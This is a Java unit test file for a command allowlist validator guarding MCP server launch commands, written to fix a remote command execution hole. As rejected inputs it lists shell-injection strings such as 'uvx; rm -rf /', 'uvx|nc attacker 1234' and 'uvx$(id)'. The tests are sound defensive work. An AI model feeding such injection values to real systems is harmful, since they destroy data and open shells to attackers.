package com.paiagent.common;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 迭代9 P1-6：MCP 启动命令白名单校验。
 *
 * <p>修复前 {@code command} 由请求体直填后原样进入 {@code ProcessBuilder}，
 * 任意已认证调用方都能借配置接口在服务端执行任意本地命令。
 */
class McpCommandValidatorTest {

    @Test
    @DisplayName("白名单启动器放行（含绝对路径与 .exe 扩展名）")
    void acceptsAllowlistedLaunchers() {
        assertDoesNotThrow(() -> McpCommandValidator.assertSafeCommand("uvx"));
        assertDoesNotThrow(() -> McpCommandValidator.assertSafeCommand("npx"));
        assertDoesNotThrow(() -> McpCommandValidator.assertSafeCommand("mcp-server-askecho-search-infinity"));
        assertDoesNotThrow(() -> McpCommandValidator.assertSafeCommand("/usr/local/bin/uvx"));
        assertDoesNotThrow(() -> McpCommandValidator.assertSafeCommand("C:\\tools\\uvx.exe"));
        assertDoesNotThrow(() -> McpCommandValidator.assertSafeCommand("C:/Users/dev/AppData/Roaming/Python/Scripts/uvx.exe"));
    }

    @Test
    @DisplayName("任意可执行文件（sh/bash/cmd/powershell）被拒绝")
    void rejectsArbitraryExecutables() {
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("sh"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("bash"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("cmd"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("/bin/rm"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("C:\\Windows\\System32\\powershell.exe"));
    }

    @Test
    @DisplayName("shell 元字符注入被拒绝")
    void rejectsShellMetacharacters() {
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("uvx; rm -rf /"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("uvx && curl evil"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("uvx|nc attacker 1234"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("uvx`id`"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("uvx$(id)"));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("uvx > /etc/passwd"));
    }

    @Test
    @DisplayName("命令内联参数被拒绝（参数应走 args）")
    void rejectsInlineArguments() {
        assertThrows(IllegalArgumentException.class,
                () -> McpCommandValidator.assertSafeCommand("uvx --from pkg cmd"));
        assertThrows(IllegalArgumentException.class,
                () -> McpCommandValidator.assertSafeCommand("sh -c whoami"));
    }

    @Test
    @DisplayName("空命令被拒绝")
    void rejectsBlank() {
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand(null));
        assertThrows(IllegalArgumentException.class, () -> McpCommandValidator.assertSafeCommand("   "));
    }

    @Test
    @DisplayName("isAllowed 与 assertSafeCommand 判定一致")
    void isAllowedMatchesAssertions() {
        assertTrue(McpCommandValidator.isAllowed("uvx"));
        assertTrue(McpCommandValidator.isAllowed("C:\\tools\\npx.cmd"));
        assertFalse(McpCommandValidator.isAllowed("bash"));
        assertFalse(McpCommandValidator.isAllowed("uvx; id"));
        assertFalse(McpCommandValidator.isAllowed(null));
    }
}
